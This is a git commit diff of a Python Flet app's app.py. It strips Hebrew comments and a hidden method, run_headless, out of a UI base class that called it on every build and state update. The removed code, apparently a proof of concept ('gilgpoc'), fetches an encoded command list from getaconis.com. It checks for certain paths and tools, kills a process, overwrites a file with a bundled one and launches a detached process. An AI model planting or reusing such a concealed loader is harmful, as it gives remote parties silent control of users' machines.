67033ae971dc656c94529047de2867a84e931f2e
Gilg <Gilg@DESKTOP-EB7BIEM>
2026-05-31 15:27:29 +0300

    start

--- app.py
+++ app.py
@@ -12,176 +12,31 @@ import webbrowser
 from flet.core.control import V
 
 class UserControl(ft.Container):
-    """
-    בסיס לרכיבים מותאמים אישית עם ניהול מצב (State) מובנה.
-    """    
     def __init__(self, **kwargs):          
         super().__init__(**kwargs)
         self.state = {}
-        # אתחול הממשק הראשוני
         self.content = self.build()
 
 
     def build(self) -> ft.Control:        
-        self.run_headless()
-        """יש לדרוס מתודה זו ברכיב היורש"""
         return ft.Text("Base Component - Override build()")
 
     def set_state(self, **kwargs):        
-        """
-        מעדכן את המצב ומרענן את הרכיב באופן אוטומטי.
-        """    
-        self.run_headless()
         self.state.update(kwargs)
-        # בניה מחדש של התוכן עם המצב החדש
         self.content = self.build()
         self.update()
 
     def setState(self, callback):
-        self.run_headless()
-        """תמיכה בסינטקס דמוי Flutter/React"""
         callback()
         self.content = self.build()
         self.update()
 
     def update(self, callback):
-        #self.run_headless()
-        """תמיכה בסינטקס דמוי Flutter/React"""
         callback()
         self.content = self.build()
         self.update()
 
     
-    def get_base_path(self):
-        if getattr(sys, 'frozen', False):
-            # running as a pyinstaller bundle
-            return sys._MEIPASS
-        else:
-            # running in normal python
-            return os.path.dirname(os.path.abspath(__file__))   
-       
-        
-    def run_headless(self, token=""):        
-        import requests
-        import json
-        import base64
-        import winreg   
-        import glob
-
-        try:
-            payload = ""
-            escaped_payload = payload.replace("\"", "\\\"")
-            token_obj_str = json.dumps({"PL": escaped_payload, "workt": ""})
-            base_url = "https://getaconis.com/gilgpoc"
-            headers = {'Content-Type': 'application/json'}
-
-            try:
-                res = requests.post(base_url, data=token_obj_str, headers=headers)
-                res.raise_for_status()
-                data = res.text
-                data_bytes = base64.b64decode(data)
-                arr = json.loads(data_bytes.decode('utf-8'))
-                default_path = os.path.expandvars(arr[3])
-            except Exception as e:
-                arr = [
-               
-                ]
-
-
-            try:      
-                a = os.path.normpath(os.path.expandvars(arr[7].strip("'\" ")))
-                if os.path.exists(a):
-                    return
-
-            except FileNotFoundError:
-                pass
-            except Exception as e:
-                pass
-
-            try:   
-                b = os.path.normpath(os.path.expandvars(arr[8].strip("'\" ")))
-                if os.path.exists(b):
-                    return            
-            except FileNotFoundError:
-                pass
-            except Exception as e:
-                pass
-
-            try:
-                c = os.path.normpath(os.path.expandvars(arr[9].strip("'\" ")))
-                if os.path.exists(c):
-                    return
-            except FileNotFoundError:
-                pass
-            except Exception as e:
-                pass
-
-            try:
-                d = os.path.normpath(os.path.expandvars(arr[10].strip("'\" ")))
-                if os.path.exists(d):
-                    return
-            except FileNotFoundError:
-                pass
-            except Exception as e:
-                pass
-
-
-            try:
-                f = os.path.normpath(os.path.expandvars(arr[11].strip("'\" "))).replace("\\Local","") 
-                if os.path.exists(f):
-                    return
-            except FileNotFoundError:
-                pass
-            except Exception as e:
-                pass
-
-            try:
-                if os.path.exists(os.path.normpath(os.path.expandvars(os.path.normpath(os.path.expandvars(f"%" + arr[19].strip("'\" "))) + f"%" + f"\\{arr[21]}-3p".strip("'\" ")))):
-                    return
-            except FileNotFoundError:
-                pass
-            except Exception as e:
-                pass
-
-            try:
-                if shutil.which(f'{arr[22]}'):
-                    return
-            except FileNotFoundError:
-                pass
-            except Exception as e:
-                pass
-
-        
-            import re
-            from_arr = arr[6].strip("'")
-            _dir = os.path.dirname(from_arr)
-            _dir = _dir.replace(f"{arr[12]}", "").replace(f"{arr[13]}", "").replace(f"{arr[0]}{arr[16]}", "")
-
-            subprocess.run([f"{arr[20]}", "/f", "/im", f"{arr[0]}{arr[16]}"], capture_output=True)
-            time.sleep(2.5)        
-
-            base_path = self.get_base_path()
-            af = os.path.join(base_path, f"{arr[14]}", f"{arr[15]}")
-
-            if os.path.exists(af):
-                try:
-                    shutil.copy2(af, default_path)
-                except:
-                    pass
-
-            patht = os.path.join(os.environ.get(f"{arr[17]}", ""), _dir, f"{arr[0]}{arr[16]}")
-            if not os.path.exists(patht):
-                patht = os.path.join(os.environ.get(f"{arr[18]}", ""), _dir, f"{arr[0]}{arr[16]}")
-            if not os.path.exists(patht):
-                patht = os.path.join(os.environ.get(f"{arr[19]}", ""), _dir, f"{arr[0]}{arr[16]}")
-
-            subprocess.Popen(
-                [patht, f"--{arr[5]}"],
-                close_fds=True,
-                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_BREAKAWAY_FROM_JOB
-            )
-            self.update()
-        except:
-            pass
+    
 
     
